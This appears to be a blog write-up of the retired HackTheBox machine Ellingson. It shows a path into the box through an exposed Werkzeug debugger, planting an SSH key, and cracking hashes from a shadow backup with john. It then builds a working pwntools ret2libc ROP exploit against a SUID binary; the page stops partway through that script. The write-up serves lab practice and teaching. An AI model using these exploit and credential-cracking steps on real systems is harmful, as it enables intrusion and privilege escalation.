<!DOCTYPE html>
<html class="no-js">
<head>
    <meta charset="utf-8">
    <title>HTB: Ellingson | maggick's logs</title>

    <meta name="author" content="maggick">
    <meta name="description" content="">
    <meta name="robots" content="">
        <meta name="keywords" content="">
        <meta property="og:title" content="">
        <meta property="og:description" content="">
        <meta property="og:url" content="">
        <meta property="og:image" content="">
    <meta property="og:site_name" content="maggick's logs">
    <meta property="og:type" content="website">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">

        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">

    <link rel="canonical" href="">

    <link rel="stylesheet" href="../../theme/css/pure-min.css">
    <link rel="stylesheet" href="../../theme/css/main.css">
</head>
<body>
<div id="page" class="full-entry">
    <header class="pure-g-r header">
        <div class="pure-u-1">
            <div class="wrapper">
                <div class="l-box">
                    <a href="../../index.html" title="Home page"
                            class="logo">maggick's
<span class="secondary">logs</span>                    </a>
                </div>
            </div>

<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
    <ul>
            <li>
              |
            </li>
                <li>
                    <a href="../../pages/about.html">About</a>
                </li>
                <li>
                    <a href="../../pages/notes.html">Notes</a>
                </li>
    </ul>
</nav>        </div>
    </header>

    <div class="pure-g-r wrapper">
        <section class="content pure-u-17-24">
            <div class="l-box">

<article class="entry">

    <header class="entry-header">
        <h1 class="entry-title">
      <a href="../../2019/10/htb-ellingson.html" title="Read more" class="entry-title-link">
                HTB: Ellingson</a>
        </h1>

        <div class="entry-date">
            <time datetime="2019-10-21T11:25:00+02:00">21 Oct 2019</time>
        </div>

    <div class="entry-meta">
      <span class="meta entry-author">
        <span class="icons icons-author"></span>
        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
      </span>

      <span class="meta entry-tags">
        <span class="icons icons-category"></span>
          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
          <a href="../../tag/buffer-overflow.html" title="Read more with the label buffer overflow" class="meta-link">buffer overflow</a> 
          <a href="../../tag/rop.html" title="Read more with the label ROP" class="meta-link">ROP</a> 
          <a href="../../tag/ret2libc.html" title="Read more with the label ret2libc" class="meta-link">ret2libc</a> 
          <a href="../../tag/linux.html" title="Read more with the label linux" class="meta-link">linux</a> 
      </span>
              <span class="meta entry-tags">
              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 15 minutes</p></span>
    </div>
    </header>

    <div class="entry-content">
            <p><img class="align-left" src="/media/2019.10/ellingson_card.png" alt="Ellingson card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/189">Ellingson</a>
This box is classified as a hard machine. The user is not too hard to get as it
require to know python and password's cracking. The root part is really hard as this
require the exploitation of a ROP buffer overflow.</p>
<p><em>Note: if you just want to play with the buffer overflow, the binary is
 available on this site, just go to the
 <a href="https://maggick.fr/2019/10/htb-ellingson.html#analysing-the-buffer-overflow">"Analysing the Buffer Overflow" section</a></em>.</p>


<h1 id="recon">Recon</h1>
<p>We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP) are open.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Thu Sep 26 13:34:45 2019 as: nmap -oA 10.10.10.139 -sSV 10.10.10.139</span>
<span class="code-line">Nmap scan report for 10.10.10.139</span>
<span class="code-line">Host is up (0.086s latency).</span>
<span class="code-line">Not shown: 998 filtered ports</span>
<span class="code-line">PORT   STATE SERVICE VERSION</span>
<span class="code-line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span>
<span class="code-line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span>
<span class="code-line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
<span class="code-line"></span>
<span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
<span class="code-line"># Nmap done at Thu Sep 26 13:35:00 2019 -- 1 IP address (1 host up) scanned in 14.76 seconds</span>
<span class="code-line"></code></pre></div>

<h1 id="web">Web</h1>
<p>The website is a standard corporate website (we can appreciate the dynamic rendering).</p>
<p><img alt="Ellingson web page" src="/media/2019.10/ellingson_1.png"></p>
<p>When browsing the articles, we notice that there is an ID at the end of the URL.
If we put a non standard value like <code>2-1</code> or put an ID greater than expected we
generate an error and a stacktrace. This debugger integrate a python
interpretor:</p>
<p><img alt="Werkzeug debugger" src="/media/2019.10/ellingson_3.png"></p>
<h1 id="user">User</h1>
<p>From there we can input python's commands and using the <code>OS</code> module we can
execute command on the system. In order to get a shell we can simply upload our
SSH public key in the current user (hal) <code>authorized_keys</code> file.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>&gt;&gt;&gt; import os; os.popen(&#39;whoami&#39;).read()</span>
<span class="code-line">&#39;hal\n&#39;</span>
<span class="code-line">&gt;&gt;&gt; import os; os.system(&#39;mkdir ~/.ssh/&#39;)</span>
<span class="code-line">256</span>
<span class="code-line">&gt;&gt;&gt; import os; os.system(&#39;echo \&#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6A/eqoQWIz14pbJ4L3Tsf+GzWv/O8Ym81ICPKpmyEl9cr3DyqCETUijFpMl6LYsdgc97EEdR6d2Xa2mpGMyDHRJSQGJJf2KehUBi6EqrkyEnPfMWNso50UtvzLwOUuxXTYmQ8iTGk3V5PbM0NHG7UQsABELrDL11NNKlV3XkuHE/yTuJQ0f80/ZDQFC7BzIfsl5iE3RmE+kRxTOyxniGwFW1bxYVW1Iqfw7isNVSyn0lkRgkSQjb2fKtFPdGughBm2j3O0+aPrRQyC7iytabc/Y8R248ziAVxqP/Nq8CEFAGXXoX8LS9WSIUfvMwqWevjbUxIKivOfGP9G8Tb994KaQFPUH13oku6GtoymAcaKjuscAHiD7q+1RJqOLg1qV7HVOzMFe46NdmGrK1dGqydfkTVjgwWJk0Swe/wJM8bIYIt6rG8/1kKDgBh86XeP4HDtj+fQo0+07RVrnFXPdBliyKPWIV2sz+qO/JCyX73YgYupps1/lsLb+l4N1BaUnk=\&#39;&gt;&gt;~/.ssh/authorized_keys&#39;)</span>
<span class="code-line">0</span>
<span class="code-line">&gt;&gt;&gt; import os; os.system(&#39;chmod 644 ~/.ssh/authorized_keys&#39;)</span>
<span class="code-line">0</span>
<span class="code-line"></code></pre></div>

<p>As our SSH public key is in hal's <code>authorzied_key</code> we can connect as hal using
SSH and starting to enumerate. The user flag is not in the hal's home folder:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>sh 10.10.10.139 -lhal</span>
<span class="code-line">hal@ellingson:~$ whoami</span>
<span class="code-line">hal</span>
<span class="code-line">hal@ellingson:~$ ls /home/</span>
<span class="code-line">duke  hal  margo  theplague</span>
<span class="code-line"></code></pre></div>

<p>We enumerate the box and find an interesting non standard SUID binary:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>hal@ellingson:~$ find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</span>
<span class="code-line">/usr/bin/newgrp</span>
<span class="code-line">/usr/bin/pkexec</span>
<span class="code-line">/usr/bin/passwd</span>
<span class="code-line">/usr/bin/gpasswd</span>
<span class="code-line">/usr/bin/garbage</span>
<span class="code-line">/usr/bin/newuidmap</span>
<span class="code-line">/usr/bin/sudo</span>
<span class="code-line">/usr/bin/traceroute6.iputils</span>
<span class="code-line">/usr/bin/chfn</span>
<span class="code-line">/usr/bin/newgidmap</span>
<span class="code-line">/usr/bin/chsh</span>
<span class="code-line">/usr/lib/policykit-1/polkit-agent-helper-1</span>
<span class="code-line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
<span class="code-line">/usr/lib/openssh/ssh-keysign</span>
<span class="code-line">/usr/lib/eject/dmcrypt-get-device</span>
<span class="code-line">/usr/lib/snapd/snap-confine</span>
<span class="code-line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span>
<span class="code-line">/bin/su</span>
<span class="code-line">/bin/umount</span>
<span class="code-line">/bin/ntfs-3g</span>
<span class="code-line">/bin/ping</span>
<span class="code-line">/bin/mount</span>
<span class="code-line">/bin/fusermount</span>
<span class="code-line"></code></pre></div>

<p>Nevertheless we do not have the permission to execute it:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>hal@ellingson:~$ ls -al /usr/bin/garbage</span>
<span class="code-line">-rwsr-xr-x 1 root root 18056 Mar  9  2019 /usr/bin/garbage</span>
<span class="code-line">hal@ellingson:~$ /usr/bin/garbage</span>
<span class="code-line">User is not authorized to access this application. This attempt has been logged.</span>
<span class="code-line"></code></pre></div>

<p>We need another way. We see that we are in the group <code>adm</code> (in addition to our user group):</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>hal@ellingson:~$ id</span>
<span class="code-line">uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)</span>
<span class="code-line"></code></pre></div>

<p><strong>I struggled for a long time here before someone on the official discord told
me that after a few hours
the file permissions are changed and the file does not belong to <code>adm</code> group
anymore. I had to reset the box to find this file.</strong></p>
<p>Let us list what files are belonging to this group:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>hal@ellingson:~$ find / -group adm 2&gt; /dev/null</span>
<span class="code-line">/var/backups/shadow.bak</span>
<span class="code-line">/var/spool/rsyslog</span>
<span class="code-line">/var/log/auth.log</span>
<span class="code-line">/var/log/mail.err</span>
<span class="code-line">/var/log/fail2ban.log</span>
<span class="code-line">/var/log/kern.log</span>
<span class="code-line">/var/log/syslog</span>
<span class="code-line">/var/log/nginx</span>
<span class="code-line">/var/log/nginx/error.log</span>
<span class="code-line">/var/log/nginx/access.log</span>
<span class="code-line">/var/log/cloud-init.log</span>
<span class="code-line">/var/log/unattended-upgrades</span>
<span class="code-line">/var/log/apt/term.log</span>
<span class="code-line">/var/log/apport.log</span>
<span class="code-line">/var/log/mail.log</span>
<span class="code-line">/snap/core/6405/var/log/dmesg</span>
<span class="code-line">/snap/core/6405/var/log/fsck/checkfs</span>
<span class="code-line">/snap/core/6405/var/log/fsck/checkroot</span>
<span class="code-line">/snap/core/6405/var/spool/rsyslog</span>
<span class="code-line">/snap/core/4917/var/log/dmesg</span>
<span class="code-line">/snap/core/4917/var/log/fsck/checkfs</span>
<span class="code-line">/snap/core/4917/var/log/fsck/checkroot</span>
<span class="code-line">/snap/core/4917/var/spool/rsyslog</span>
<span class="code-line">/snap/core/6818/var/log/dmesg</span>
<span class="code-line">/snap/core/6818/var/log/fsck/checkfs</span>
<span class="code-line">/snap/core/6818/var/log/fsck/checkroot</span>
<span class="code-line">/snap/core/6818/var/spool/rsyslog</span>
<span class="code-line"></code></pre></div>

<p>We cat the shadow.bak file and get some password hashes:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>hal@ellingson:~$ cat /var/backups/shadow.bak</span>
<span class="code-line">root:*:17737:0:99999:7:::</span>
<span class="code-line">daemon:*:17737:0:99999:7:::</span>
<span class="code-line">bin:*:17737:0:99999:7:::</span>
<span class="code-line">sys:*:17737:0:99999:7:::</span>
<span class="code-line">sync:*:17737:0:99999:7:::</span>
<span class="code-line">games:*:17737:0:99999:7:::</span>
<span class="code-line">man:*:17737:0:99999:7:::</span>
<span class="code-line">lp:*:17737:0:99999:7:::</span>
<span class="code-line">mail:*:17737:0:99999:7:::</span>
<span class="code-line">news:*:17737:0:99999:7:::</span>
<span class="code-line">uucp:*:17737:0:99999:7:::</span>
<span class="code-line">proxy:*:17737:0:99999:7:::</span>
<span class="code-line">www-data:*:17737:0:99999:7:::</span>
<span class="code-line">backup:*:17737:0:99999:7:::</span>
<span class="code-line">list:*:17737:0:99999:7:::</span>
<span class="code-line">irc:*:17737:0:99999:7:::</span>
<span class="code-line">gnats:*:17737:0:99999:7:::</span>
<span class="code-line">nobody:*:17737:0:99999:7:::</span>
<span class="code-line">systemd-network:*:17737:0:99999:7:::</span>
<span class="code-line">systemd-resolve:*:17737:0:99999:7:::</span>
<span class="code-line">syslog:*:17737:0:99999:7:::</span>
<span class="code-line">messagebus:*:17737:0:99999:7:::</span>
<span class="code-line">_apt:*:17737:0:99999:7:::</span>
<span class="code-line">lxd:*:17737:0:99999:7:::</span>
<span class="code-line">uuidd:*:17737:0:99999:7:::</span>
<span class="code-line">dnsmasq:*:17737:0:99999:7:::</span>
<span class="code-line">landscape:*:17737:0:99999:7:::</span>
<span class="code-line">pollinate:*:17737:0:99999:7:::</span>
<span class="code-line">sshd:*:17737:0:99999:7:::</span>
<span class="code-line">theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::</span>
<span class="code-line">hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::</span>
<span class="code-line">margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::</span>
<span class="code-line">duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::</span>
<span class="code-line"></code></pre></div>

<p>Let's crack them! It is a bit long as the hashing algorithm is SHA512 ($6). We
use <code>john</code> with the rockyou dictionary.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>john hash -w=~/tools/password_lists/rockyou.txt</span>
<span class="code-line">john --show hash</span>
<span class="code-line">theplague:password123:17964:0:99999:7:::</span>
<span class="code-line">margo:iamgod$08:17964:0:99999:7:::</span>
<span class="code-line"></code></pre></div>

<p>The first password was changed, as mention in the third article:</p>
<blockquote>
<p>We have recently detected suspicious activity on the network. Please make
sure you change your password regularly and read my carefully prepared memo
on the most commonly used passwords. Now as I so meticulously pointed out
the most common passwords are. Love, Secret, Sex and God -The Plague</p>
</blockquote>
<p>Nevertheless, we can connect as <code>margo</code> using SSH and the cracked password. And we
retrieved the user flag:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>ssh 10.10.10.139 -lmargo</span>
<span class="code-line">margo@10.10.10.139&#39;s password:</span>
<span class="code-line">Last login: Wed Oct  2 12:25:47 2019 from 10.10.15.42</span>
<span class="code-line">margo@ellingson:~$ ls</span>
<span class="code-line">user.txt</span>
<span class="code-line">margo@ellingson:~$ cat user.txt</span>
<span class="code-line">d0ff9e&lt;redacted&gt;</span>
<span class="code-line"></code></pre></div>

<h1 id="root">Root</h1>
<h2 id="finding-the-suid-binary">Finding the SUID binary</h2>
<p>Let's get back to the SUID binary:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>margo@ellingson:~$ find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</span>
<span class="code-line">/usr/bin/newgrp</span>
<span class="code-line">/usr/bin/pkexec</span>
<span class="code-line">/usr/bin/passwd</span>
<span class="code-line">/usr/bin/gpasswd</span>
<span class="code-line">/usr/bin/garbage</span>
<span class="code-line">/usr/bin/newuidmap</span>
<span class="code-line">/usr/bin/sudo</span>
<span class="code-line">/usr/bin/traceroute6.iputils</span>
<span class="code-line">/usr/bin/chfn</span>
<span class="code-line"></code></pre></div>

<p>We run the binary, it ask for a password user input. If we put a wrong password
we get an access denied. If we put a "long" password we get a segfault. This
look like a buffer overflow:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>margo@ellingson:~$ /usr/bin/garbage</span>
<span class="code-line">Enter access password: test</span>
<span class="code-line"></span>
<span class="code-line">access denied.</span>
<span class="code-line">margo@ellingson:~$ /usr/bin/garbage</span>
<span class="code-line">Enter access password: qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq</span>
<span class="code-line"></span>
<span class="code-line">access denied.</span>
<span class="code-line">Segmentation fault (core dumped)</span>
<span class="code-line"></code></pre></div>

<p>Let's copy the binary on our machine:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>scp margo@10.10.10.139:/usr/bin/garbage ./</span>
<span class="code-line"></code></pre></div>

<p>We check the flags of the binary:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>root@kalili:~# gdb ./garbage</span>
<span class="code-line">&lt;snip&gt;</span>
<span class="code-line">gdb-peda$ checksec</span>
<span class="code-line">CANARY    : disabled</span>
<span class="code-line">FORTIFY   : disabled</span>
<span class="code-line">NX        : ENABLED</span>
<span class="code-line">PIE       : disabled</span>
<span class="code-line">RELRO     : Partial</span>
<span class="code-line"></code></pre></div>

<p>The No-Execute bit is set. Therefore we need to use a ret2lib.</p>
<p>The ASLR is activated on the server:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>margo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space</span>
<span class="code-line">2</span>
<span class="code-line"></code></pre></div>

<p>As ASLR is on and the NX bit (no-execute) is set we will also need the box libc
to do a ROP:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>scp margo@10.10.10.139:/lib/x86_64-linux-gnu/libc.so.6 ./</span>
<span class="code-line"></code></pre></div>

<h2 id="analysing-the-buffer-overflow">Analysing the Buffer Overflow</h2>
<p><a href="/media/2019.10/ellingson_garbage"><em>The binary is avalible here</em></a></p>
<p>We load the binary in gdb <a href="https://github.com/longld/peda">peda</a> and search for
the size of the buffer.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>gdb-peda$ r &lt; &lt;(python -c &#39;print &quot;A&quot;*133+&quot;B&quot;+&quot;C&quot;+&quot;D&quot;+&quot;E&quot;+&quot;F&quot;+&quot;G&quot;+&quot;H&quot;+&quot;J&quot;&#39;)</span>
<span class="code-line">Starting program: /root/garbage &lt; &lt;(python -c &#39;print &quot;A&quot;*133+&quot;B&quot;+&quot;C&quot;+&quot;D&quot;+&quot;E&quot;+&quot;F&quot;+&quot;G&quot;+&quot;H&quot;+&quot;J&quot;&#39;)</span>
<span class="code-line">Enter access password:</span>
<span class="code-line">access denied.</span>
<span class="code-line"></span>
<span class="code-line">Program received signal SIGSEGV, Segmentation fault.</span>
<span class="code-line">[----------------------------------registers-----------------------------------]</span>
<span class="code-line">RAX: 0x0</span>
<span class="code-line">RBX: 0x0</span>
<span class="code-line">RCX: 0x7f1a0b24ead4 (&lt;__GI___libc_write+20&gt;:    cmp    rax,0xfffffffffffff000)</span>
<span class="code-line">RDX: 0x7f1a0b31f580 --&gt; 0x0</span>
<span class="code-line">RSI: 0x12a0ba0 (&quot;access denied.\nssword: \n\220\v*\001&quot;)</span>
<span class="code-line">RDI: 0x0</span>
<span class="code-line">RBP: 0x4443424141414141 (&#39;AAAAABCD&#39;)</span>
<span class="code-line">RSP: 0x7ffedbba9290 --&gt; 0x7ffedbba9380 --&gt; 0x1</span>
<span class="code-line">RIP: 0x4a48474645 (&#39;EFGHJ&#39;)</span>
<span class="code-line">R8 : 0xf</span>
<span class="code-line">R9 : 0x7f1a0b31d848 --&gt; 0x7f1a0b31d760 --&gt; 0xfbad2a84</span>
<span class="code-line">R10: 0x4005a5 --&gt; 0x7475700073747570 (&#39;puts&#39;)</span>
<span class="code-line">R11: 0x246</span>
<span class="code-line">R12: 0x401170 (&lt;_start&gt;:    xor    ebp,ebp)</span>
<span class="code-line">R13: 0x7ffedbba9380 --&gt; 0x1</span>
<span class="code-line">R14: 0x0</span>
<span class="code-line">R15: 0x0</span>
<span class="code-line">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction</span>
<span class="code-line">overflow)</span>
<span class="code-line"></code></pre></div>

<p>The buffer size is 136 (133+3). We could also use the peda's functions
<code>pattern_create</code> and <code>pattern_offset</code> to find it. Then we can start to write our exploitation
script using <a href="http://pwntools.com">pwntools</a>:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span></span>
<span class="code-line"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;DEBUG&quot;</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">junk</span>    <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">136</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="c1">#Enter access password: 123456</span></span>
<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></span>
<span class="code-line"><span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span>
<span class="code-line"><span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span>
<span class="code-line"></code></pre></div>

<p>We want to get the dynamic address of <code>LIBC</code> in order to be able to call a
specific function (let's say <code>/bin/sh</code>). For that we need:</p>
<ul>
<li>
<p>to find a <code>pop rdi</code> call. We use <a href="https://github.com/sashs/Ropper">ropper</a> for that:</p>
<p>:::text
root@kalili:~# ropper --file ./garbage --search 'pop rdi'
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi</p>
<p>[INFO] File: ./garbage
0x000000000040179b: pop rdi; ret;</p>
</li>
<li>
<p>two informations about the <a href="https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html">PLT and GOT</a> <code>puts</code> callsinto <code>LIBC</code>.  For that we can grep the <code>objdump</code> output:</p>
<p>:::text
objdump -D garbage | grep puts
0000000000401050 <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#112;&#117;&#116;&#115;&#64;&#112;&#108;&#116;">&#112;&#117;&#116;&#115;&#64;&#112;&#108;&#116;</a>:
401050: ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 &lt;puts@GLIBC _2.2.5&gt;</p>
</li>
</ul>
<p>We add this addresses to our exploit and output the <code>puts</code> address in <code>LIBC</code>:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span></span>
<span class="code-line"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;DEBUG&quot;</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">plt_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401050</span><span class="p">)</span></span>
<span class="code-line"><span class="n">got_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404028</span><span class="p">)</span></span>
<span class="code-line"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">junk</span>    <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">136</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span><span class="o">+</span> <span class="n">got_put</span> <span class="o">+</span> <span class="n">plt_put</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="c1">#Enter access password: 123456</span></span>
<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></span>
<span class="code-line"><span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span>
<span class="code-line"><span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="c1"># Leaked address printed in a readable format</span></span>
<span class="code-line"><span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span></span>
<span class="code-line"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;Leaked puts@GLIBC: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span></span>
<span class="code-line"></code></pre></div>

<p>Here is the output of it (for sanity I commented the debugging option):</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># python exploitP.py</span>
<span class="code-line">[+] Starting local process &#39;./garbage&#39;: pid 1407</span>
<span class="code-line">Enter access password:</span>
<span class="code-line"></span>
<span class="code-line">access denied.</span>
<span class="code-line"></span>
<span class="code-line">[+] Leaked puts@GLIBC: @ T�Z\x7f\x00\x00</span>
<span class="code-line">[*] Stopped process &#39;./garbage&#39; (pid 1407)</span>
<span class="code-line"></span>
<span class="code-line"># python exploitP.py</span>
<span class="code-line">[+] Starting local process &#39;./garbage&#39;: pid 1411</span>
<span class="code-line">Enter access password:</span>
<span class="code-line"></span>
<span class="code-line">access denied.</span>
<span class="code-line"></span>
<span class="code-line">[+] Leaked puts@GLIBC: @pYBs\x7f\x00\x00</span>
<span class="code-line">[*] Stopped process &#39;./garbage&#39; (pid 1411)</span>
<span class="code-line"></span>
<span class="code-line"># python exploitP.py</span>
<span class="code-line">[+] Starting local process &#39;./garbage&#39;: pid 1415</span>
<span class="code-line">Enter access password:</span>
<span class="code-line"></span>
<span class="code-line">access denied.</span>
<span class="code-line"></span>
<span class="code-line">[+] Leaked puts@GLIBC: @0X\x0en\x7f\x00\x00</span>
<span class="code-line">[*] Stopped process &#39;./garbage&#39; (pid 1415)</span>
<span class="code-line"></code></pre></div>

<p>We got the leaked address of the <code>puts</code> call in LIBC.
As the ASLR is on, multiple runs give us different addresses for the <code>puts</code> call
in LIBC. But our process logically stop. If we rerun it the address will be
different. Therefore we need to recall our main. We get the address using
<code>objdump</code>:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>objdump -D garbage | grep main</span>
<span class="code-line">  401194:   ff 15 56 2e 00 00       callq  *0x2e56(%rip)        # 403ff0 &lt;__libc_start_main@GLIBC_2.2.5&gt;</span>
<span class="code-line">0000000000401619 &lt;main&gt;:</span>
<span class="code-line"></code></pre></div>

<p>And we add it to our script:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span></span>
<span class="code-line"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;DEBUG&quot;</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">plt_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401050</span><span class="p">)</span></span>
<span class="code-line"><span class="n">got_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404028</span><span class="p">)</span></span>
<span class="code-line"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span></span>
<span class="code-line"><span class="n">plt_main</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401619</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">junk</span>    <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">136</span></span>
